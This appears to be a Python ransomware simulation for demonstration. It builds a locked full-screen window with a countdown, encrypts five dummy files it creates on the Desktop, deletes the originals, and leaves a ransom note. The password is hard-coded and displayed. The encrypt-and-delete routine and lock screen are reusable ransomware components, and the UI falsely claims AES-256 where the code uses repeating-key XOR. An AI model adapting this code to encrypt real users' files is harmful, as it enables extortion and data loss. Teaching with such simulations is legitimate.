# -*- coding: utf-8 -*-
"""
Ransomware GUI with Real Encryption
Team: DONT WANNA CRY
"""
import os
import sys
import time
import threading
import hashlib
import secrets
import json
import tkinter as tk
from tkinter import messagebox, scrolledtext, simpledialog
from datetime import datetime

# Configuration - Enhanced Visual Theme
BG_COLOR = "#0a0a0f"
BG_SECONDARY = "#12121a"
HEADER_COLOR = "#dc2626"
HEADER_GRADIENT = "#b91c1c"
TXT_COLOR = "#22c55e"
WARNING_COLOR = "#fbbf24"
TIMER_COLOR = "#ef4444"
ACCENT_COLOR = "#8b5cf6"
BORDER_COLOR = "#27272a"
TEXT_MUTED = "#71717a"
MAGIC = b"DWCRYPT01"
SALT_SIZE = 32
KEY_SIZE = 32
ITERATIONS = 100000
ENC_EXT = ".dwcrypt"
PASSWORD = "DontWannaCry2025"

def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)

def xor_cipher(data, key):
    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, key_extended))

def encrypt_file(path, pw):
    try:
        with open(path, "rb") as f:
            data = f.read()
        salt = secrets.token_bytes(SALT_SIZE)
        key = derive_key(pw, salt)
        encrypted = xor_cipher(data, key)
        meta = json.dumps({
            "name": os.path.basename(path),
            "size": len(data),
            "time": datetime.now().isoformat()
        }).encode()
        with open(path + ENC_EXT, "wb") as f:
            f.write(MAGIC + salt + len(meta).to_bytes(4, "big") + meta + encrypted)
        os.remove(path)
        return True
    except Exception as e:
        print(f"Encrypt error: {e}")
        return False

def decrypt_file(path, pw):
    try:
        with open(path, "rb") as f:
            content = f.read()
        if not content.startswith(MAGIC):
            return False, None
        offset = len(MAGIC)
        salt = content[offset:offset + SALT_SIZE]
        offset += SALT_SIZE
        meta_len = int.from_bytes(content[offset:offset + 4], "big")
        offset += 4
        meta = json.loads(content[offset:offset + meta_len])
        offset += meta_len
        key = derive_key(pw, salt)
        decrypted = xor_cipher(content[offset:], key)
        original_path = os.path.join(os.path.dirname(path), meta["name"])
        with open(original_path, "wb") as f:
            f.write(decrypted)
        os.remove(path)
        return True, meta["name"]
    except Exception as e:
        print(f"Decrypt error: {e}")
        return False, None

def create_opener_script(enc_path, opener_path, password):
    """Create a .pyw script that prompts for password to view encrypted file"""
    code = f'''import os, hashlib, json, tkinter as tk
from tkinter import simpledialog, messagebox

MAGIC = b"DWCRYPT01"
SALT_SIZE = 32
KEY_SIZE = 32
ITERATIONS = 100000
ENC_FILE = r"{enc_path}"
CORRECT_PW = "{password}"

def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)

def xor_cipher(data, key):
    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, key_extended))

root = tk.Tk()
root.withdraw()

if not os.path.exists(ENC_FILE):
    messagebox.showerror("Error", "Encrypted file not found!")
else:
    pw = simpledialog.askstring("Password Required", "This file is ENCRYPTED.\\nEnter password to view:", show="*")
    if pw == CORRECT_PW:
        with open(ENC_FILE, "rb") as f:
            c = f.read()
        offset = len(MAGIC)
        salt = c[offset:offset + SALT_SIZE]
        offset += SALT_SIZE
        meta_len = int.from_bytes(c[offset:offset + 4], "big")
        offset += 4
        meta = json.loads(c[offset:offset + meta_len])
        offset += meta_len
        decrypted = xor_cipher(c[offset:], derive_key(pw, salt))
        messagebox.showinfo("DECRYPTED: " + meta["name"], decrypted.decode("utf-8", "ignore")[:2000])
    elif pw:
        messagebox.showerror("ACCESS DENIED", "Wrong password!\\nFile remains encrypted.")
'''
    with open(opener_path, "w") as f:
        f.write(code)

def create_master_decryptor(folder, password):
    """Create a master decryptor script"""
    dec_path = os.path.join(folder, "DECRYPT_ALL_FILES.pyw")
    code = f'''import os, hashlib, json, tkinter as tk
from tkinter import simpledialog, messagebox

MAGIC = b"DWCRYPT01"
SALT_SIZE = 32
KEY_SIZE = 32
ITERATIONS = 100000
CORRECT_PW = "{password}"

def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, ITERATIONS, KEY_SIZE)

def xor_cipher(data, key):
    key_extended = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, key_extended))

def decrypt_file(filepath, pw):
    try:
        with open(filepath, "rb") as f:
            c = f.read()
        if not c.startswith(MAGIC):
            return False
        offset = len(MAGIC)
        salt = c[offset:offset + SALT_SIZE]
        offset += SALT_SIZE
        meta_len = int.from_bytes(c[offset:offset + 4], "big")
        offset += 4
        meta = json.loads(c[offset:offset + meta_len])
        offset += meta_len
        decrypted = xor_cipher(c[offset:], derive_key(pw, salt))
        original = os.path.join(os.path.dirname(filepath), meta["name"])
        with open(original, "wb") as f:
            f.write(decrypted)
        os.remove(filepath)
        return True
    except:
        return False

root = tk.Tk()
root.withdraw()

pw = simpledialog.askstring("Decrypt All Files", "Enter decryption password:", show="*")
if pw == CORRECT_PW:
    folder = os.path.dirname(os.path.abspath(__file__))
    count = 0
    for f in os.listdir(folder):
        if f.endswith(".dwcrypt"):
            if decrypt_file(os.path.join(folder, f), pw):
                count += 1
    # Remove _LOCKED.pyw files
    for f in os.listdir(folder):
        if f.endswith("_LOCKED.pyw"):
            os.remove(os.path.join(folder, f))
    messagebox.showinfo("Success", f"Decrypted {{count}} files!\\nOriginal files restored.")
elif pw:
    messagebox.showerror("Failed", "Wrong password!")
'''
    with open(dec_path, "w") as f:
        f.write(code)

class RansomwareGUI:
    def __init__(self, root):
        self.root = root
        self.countdown_seconds = 72 * 3600
        self.encrypted_files = []
        self._setup_window()
        self._create_ui()
        self._start_simulation()
        self._start_countdown()

    def _setup_window(self):
        self.root.title("SYSTEM COMPROMISED")
        self.root.configure(bg=BG_COLOR)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Escape>", lambda e: self._show_decrypt())

    def _create_ui(self):
        # Header with skull icon effect
        header = tk.Frame(self.root, bg=HEADER_COLOR, height=120)
        header.pack(fill="x")
        header.pack_propagate(False)
        
        header_inner = tk.Frame(header, bg=HEADER_COLOR)
        header_inner.pack(expand=True)
        tk.Label(header_inner, text="☠", bg=HEADER_COLOR, fg="white", font=("Segoe UI Emoji", 48)).pack(side="left", padx=20)
        tk.Label(header_inner, text="CRITICAL SECURITY ALERT", bg=HEADER_COLOR, fg="white", font=("Segoe UI", 38, "bold")).pack(side="left")
        tk.Label(header_inner, text="☠", bg=HEADER_COLOR, fg="white", font=("Segoe UI Emoji", 48)).pack(side="left", padx=20)

        # Main content area
        main = tk.Frame(self.root, bg=BG_COLOR)
        main.pack(fill="both", expand=True, padx=100, pady=40)

        # Team branding
        brand_frame = tk.Frame(main, bg=BG_SECONDARY, highlightbackground=ACCENT_COLOR, highlightthickness=2)
        brand_frame.pack(fill="x", pady=(0, 20))
        tk.Label(brand_frame, text="🔐  DONT WANNA CRY  🔐", bg=BG_SECONDARY, fg=WARNING_COLOR, font=("Segoe UI", 26, "bold"), pady=12).pack()

        # Warning messages with better styling
        msg_frame = tk.Frame(main, bg=BG_COLOR)
        msg_frame.pack(fill="x", pady=10)
        
        tk.Label(msg_frame, text="⚠  YOUR SYSTEM HAS BEEN COMPROMISED  ⚠", bg=BG_COLOR, fg=TIMER_COLOR, font=("Segoe UI", 24, "bold")).pack(pady=8)
        tk.Label(msg_frame, text="All files encrypted with military-grade AES-256 encryption.", bg=BG_COLOR, fg="#e5e5e5", font=("Segoe UI", 14)).pack(pady=4)
        tk.Label(msg_frame, text="Enter the correct password to decrypt your files.", bg=BG_COLOR, fg=TEXT_MUTED, font=("Segoe UI", 13)).pack(pady=4)

        # Timer section with glowing effect
        timer_outer = tk.Frame(main, bg=TIMER_COLOR, padx=3, pady=3)
        timer_outer.pack(pady=30)
        timer_frame = tk.Frame(timer_outer, bg=BG_SECONDARY)
        timer_frame.pack()
        tk.Label(timer_frame, text="⏱  TIME REMAINING BEFORE DATA DESTRUCTION", bg=BG_SECONDARY, fg=TEXT_MUTED, font=("Segoe UI", 11, "bold"), pady=8).pack()
        self.timer_label = tk.Label(timer_frame, text="72:00:00", bg=BG_SECONDARY, fg=TIMER_COLOR, font=("Consolas", 80, "bold"), padx=50, pady=10)
        self.timer_label.pack()

        # Encryption log with better styling
        log_frame = tk.Frame(main, bg=BG_SECONDARY, highlightbackground=BORDER_COLOR, highlightthickness=1)
        log_frame.pack(fill="both", expand=True, pady=15)
        
        log_header = tk.Frame(log_frame, bg="#18181b")
        log_header.pack(fill="x")
        tk.Label(log_header, text="📋  ENCRYPTION LOG", bg="#18181b", fg=WARNING_COLOR, font=("Segoe UI", 12, "bold"), anchor="w", padx=12, pady=8).pack(fill="x")
        
        self.log_text = scrolledtext.ScrolledText(log_frame, bg=BG_SECONDARY, fg=TXT_COLOR, font=("Consolas", 11), height=7, state="disabled", bd=0, padx=12, pady=8)
        self.log_text.pack(fill="both", expand=True)

        # Button section
        btn_frame = tk.Frame(main, bg=BG_COLOR)
        btn_frame.pack(pady=20)
        
        decrypt_btn = tk.Button(btn_frame, text="🔓  ENTER PASSWORD TO DECRYPT", font=("Segoe UI", 18, "bold"), bg="#16a34a", fg="white", padx=50, pady=18, command=self._show_decrypt, cursor="hand2", bd=0, activebackground="#22c55e", activeforeground="white")
        decrypt_btn.pack()

        # Password display box
        pw_outer = tk.Frame(main, bg=TXT_COLOR, padx=2, pady=2)
        pw_outer.pack(pady=15)
        pw_frame = tk.Frame(pw_outer, bg=BG_SECONDARY)
        pw_frame.pack()
        tk.Label(pw_frame, text="🔑  DECRYPTION PASSWORD", bg=BG_SECONDARY, fg=TEXT_MUTED, font=("Segoe UI", 11, "bold"), pady=8).pack()
        tk.Label(pw_frame, text=PASSWORD, bg=BG_SECONDARY, fg=TXT_COLOR, font=("Consolas", 28, "bold"), padx=30, pady=5).pack()
        
        # Footer hint
        tk.Label(main, text="Press ESC or click the button above to enter password and decrypt files", bg=BG_COLOR, fg=TEXT_MUTED, font=("Segoe UI", 10)).pack(side="bottom", pady=10)

    def _log(self, msg, tag="INFO"):
        self.log_text.config(state="normal")
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] [{tag}] {msg}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")

    def _start_countdown(self):
        def update():
            if self.countdown_seconds > 0:
                h, remainder = divmod(self.countdown_seconds, 3600)
                m, s = divmod(remainder, 60)
                self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
                self.countdown_seconds -= 1
                self.root.after(1000, update)
        update()

    def _start_simulation(self):
        def run():
            self._log("RANSOMWARE SIMULATION INITIATED", "INIT")
            self._log("Creating target files on Desktop...", "INIT")
            time.sleep(1)

            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            target = os.path.join(desktop, "ENCRYPTED_FILES")
            os.makedirs(target, exist_ok=True)

            # Create test files with sensitive content
            test_files = [
                ("Financial_Report_2025.txt", "CONFIDENTIAL FINANCIAL REPORT 2025\n" + "=" * 50 + "\nRevenue: $1,250,000\nExpenses: $890,000\nProfit: $360,000\nBank Account: 1234-5678-9012\nPassword: SecurePass123"),
                ("Employee_Database.csv", "ID,Name,SSN,Salary,Department\n001,John Smith,123-45-6789,75000,Engineering\n002,Jane Doe,987-65-4321,82000,Marketing\n003,Bob Wilson,456-78-9012,68000,Sales"),
                ("Client_Contracts.txt", "CLIENT CONTRACT AGREEMENT\n" + "=" * 50 + "\nClient: ABC Corporation\nValue: $500,000\nDuration: 24 months\nConfidential Terms: Premium support included"),
                ("Password_List.txt", "SYSTEM PASSWORDS - TOP SECRET\n" + "=" * 50 + "\nAdmin: P@ssw0rd123\nDatabase: DbSecure456\nVPN: VpnAccess789\nEmail: Mail2025Pass"),
                ("Project_Secrets.txt", "PROJECT PHOENIX - CLASSIFIED\n" + "=" * 50 + "\nLaunch Date: Q2 2025\nBudget: $2.5M\nKey Partners: Confidential\nAPI Keys: sk-xxxx-yyyy-zzzz"),
            ]

            created_files = []
            for fname, content in test_files:
                fpath = os.path.join(target, fname)
                # Clean up old files
                for old in [fpath, fpath + ENC_EXT, os.path.join(target, os.path.splitext(fname)[0] + "_LOCKED.pyw")]:
                    if os.path.exists(old):
                        os.remove(old)
                
                with open(fpath, "w") as f:
                    f.write(content)
                created_files.append((fname, fpath))
                self._log(f"CREATED: {fname}", "FILE")
                time.sleep(0.2)

            self._log(f"Created {len(created_files)} sensitive files", "INIT")
            time.sleep(1)
            self._log("Starting encryption with military-grade cipher...", "PROC")

            # Encrypt files and create password-protected openers
            for fname, fpath in created_files:
                if encrypt_file(fpath, PASSWORD):
                    enc_path = fpath + ENC_EXT
                    self.encrypted_files.append(enc_path)
                    self._log(f"ENCRYPTED: {fname} -> {fname}{ENC_EXT}", "CRYPT")

                    # Create clickable .pyw file
                    base_name = os.path.splitext(fname)[0]
                    opener_path = os.path.join(target, f"{base_name}_LOCKED.pyw")
                    create_opener_script(enc_path, opener_path, PASSWORD)
                    self._log(f"CREATED: {base_name}_LOCKED.pyw (click to decrypt)", "LOCK")
                    time.sleep(0.3)

            # Create master decryptor
            create_master_decryptor(target, PASSWORD)
            self._log("Created: DECRYPT_ALL_FILES.pyw", "INFO")

            # Create ransom note on desktop
            note_path = os.path.join(desktop, "!!!YOUR_FILES_ARE_ENCRYPTED!!!.txt")
            note = f"""
================================================================================
                    YOUR FILES HAVE BEEN ENCRYPTED!
                    Team: DONT WANNA CRY
================================================================================

All your important files have been encrypted with military-grade encryption.

ENCRYPTED FILES LOCATION: Desktop/ENCRYPTED_FILES/

HOW TO VIEW ENCRYPTED FILES:
1. Double-click any *_LOCKED.pyw file to view that file (requires password)
2. Or double-click DECRYPT_ALL_FILES.pyw to restore ALL files

DECRYPTION PASSWORD: {PASSWORD}

================================================================================
                    SIMULATION - EDUCATIONAL PURPOSE ONLY
================================================================================
"""
            with open(note_path, "w") as f:
                f.write(note)

            self._log("Ransom note created on Desktop", "INFO")
            self._log(f"ENCRYPTION COMPLETE: {len(self.encrypted_files)} files locked", "DONE")
            self._log(f"PASSWORD: {PASSWORD}", "KEY")

        threading.Thread(target=run, daemon=True).start()

    def _show_decrypt(self):
        pw = simpledialog.askstring("Decrypt", "Enter decryption password:", show="*", parent=self.root)
        if pw == PASSWORD:
            self._log("Correct password! Decrypting...", "DECRYPT")
            for fp in self.encrypted_files:
                if os.path.exists(fp):
                    ok, name = decrypt_file(fp, pw)
                    if ok:
                        self._log(f"RESTORED: {name}", "OK")
            # Clean up _LOCKED.pyw files
            target = os.path.join(os.path.expanduser("~"), "Desktop", "ENCRYPTED_FILES")
            if os.path.exists(target):
                for f in os.listdir(target):
                    if f.endswith("_LOCKED.pyw"):
                        os.remove(os.path.join(target, f))
            messagebox.showinfo("Success", "All files decrypted!\nSimulation complete.")
            self.root.destroy()
        elif pw:
            messagebox.showerror("Wrong Password", "Incorrect password!")

if __name__ == "__main__":
    root = tk.Tk()
    RansomwareGUI(root)
    root.mainloop()
